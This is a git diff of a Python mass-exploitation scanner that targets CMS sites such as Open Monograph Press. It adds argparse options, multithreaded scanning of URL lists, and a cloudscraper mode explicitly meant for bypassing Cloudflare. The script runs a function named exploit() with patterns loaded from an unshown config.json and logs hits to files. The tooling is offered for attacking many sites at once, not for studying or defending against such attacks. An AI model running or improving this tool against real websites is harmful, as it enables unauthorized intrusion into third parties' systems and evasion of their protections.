@@ -1,12 +1,12 @@
+#!/usr/bin/env python
 # Open Monograph Press Access : /files/presses/1/monographs/
 from fake_useragent import UserAgent
-import requests
-import re
-import sys, json
+import requests, re, sys, json, argparse, cloudscraper
 from multiprocessing.dummy import Pool
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+scraper = cloudscraper.create_scraper()
 config = open('config.json')
 exploiter = json.load(config)
 
@@ -17,14 +17,15 @@ confTimeout = 15
 confPayload = ''
 
 help = '''
-use --target=site.com
-use --file=list.txt
-use --file=list.txt --thread=30
-        
-    --help HELP
-    --target Scan Single URL
-    --file Scan From File
-        --thread Multiproccess Thread
+Params Helpers
+---
+
+options:
+  -h   or  --help       :  show this help message and exit
+  -u   or  --url        :  scan with single url (eg: http://target.com/) (default: None)
+  -l   or  --list       :  scan with mass url list (default: None)
+  -t   or  --thread     :  multithread proccess (default: None)
+  -m   or   --method    :  method requests or scrapper (bypassing cloudflare) (default: None)
 '''
 
 def debug(url, err):
@@ -74,15 +75,20 @@ def exploit(url):
         url = url
     
     try:
-        UserAgent = UserAgent().chrome
+        ua = UserAgent().chrome
     except:
-        UserAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
+        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
     
-    confHeaders = {"User-Agent": str(UserAgent)}
+    confHeaders = {"User-Agent": str(ua)}
     
     try:
+        method = open('method.ini', 'r').read()
         print (f'[!] [ CMS ] Check : {url}')
-        check = requests.get(url, headers=confHeaders, timeout=confTimeout, allow_redirects=confAllowRedirect)
+        
+        if method == 'scrapper':
+            check = scraper.get(url, headers=confHeaders, timeout=confTimeout, allow_redirects=confAllowRedirect)
+        else:
+            check = requests.get(url, headers=confHeaders, timeout=confTimeout, allow_redirects=confAllowRedirect)
         
         for conf in exploiter:
             name = conf['name']
@@ -128,6 +134,7 @@ def exploit(url):
                     else:pass
                 else:pass
         
+        
         # Consist Response
         if ".php?" in check.text:
             open('cms_foundparams.txt', 'a').write(url +'\n')
@@ -147,37 +154,41 @@ def exploit(url):
         
      
 def init():
-    if len(sys.argv) == 1:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", help="Scan with single url (eg: http://target.com/)")
+    parser.add_argument("-l", "--list", help="Scan with mass url list")
+    parser.add_argument("-t", "--thread", help="Multithread Proccess")
+    parser.add_argument("-m", "--method", help="Method requests or scrapper (bypassing cloudflare)")
+    args = parser.parse_args()
+    
+    if args.url == None and args.list == None:
         print (help)
         return sys.exit()
-        
     
-    command = sys.argv[1]
-    if command == '--help':
-        print (help)
+    if args.method != None or str(args.method) == 'scrapper':
+        open('method.ini', 'w').write('scrapper')
+    else:
+        open('method.ini', 'w').write('requests')
+            
+    if args.url != None:
+        exploit(args.url)
         return sys.exit()
+    else:pass
     
-    if '--target=' in command:
-        target = command.replace('--target=', '')
-        exploit(target)
-        
-    elif '--file=' in command:
-        sitelist = command.replace('--file=', '')
+    if args.list != None:
         try:
-            open(sitelist, 'r', encoding='utf8').read()
+            open(args.list)
         except:
             print ('[!] Sitelist Not Found')
             return sys.exit()
         
-        if len(sys.argv) == 3:    
-            if '--thread=' in sys.argv[2]:
-                thread = sys.argv[2].replace('--thread=', '')
-            else:pass
+        if args.thread != None:
+            thread = int(args.thread)
         else:
             thread = 25
-    
+        
         try:
-            sites = open(sitelist, "r", encoding='utf8').read().splitlines()
+            sites = open(args.list, "r", encoding='utf8').read().splitlines()
             try:
                 pp = Pool(int(thread))
                 pp.map(exploit, sites)
@@ -187,6 +198,9 @@ def init():
         except:
             print("[!] Sitelist not found!")
             return sys.exit()
-
+        
+    else:
+        print (help)
+        return sys.exit()
 
 init()
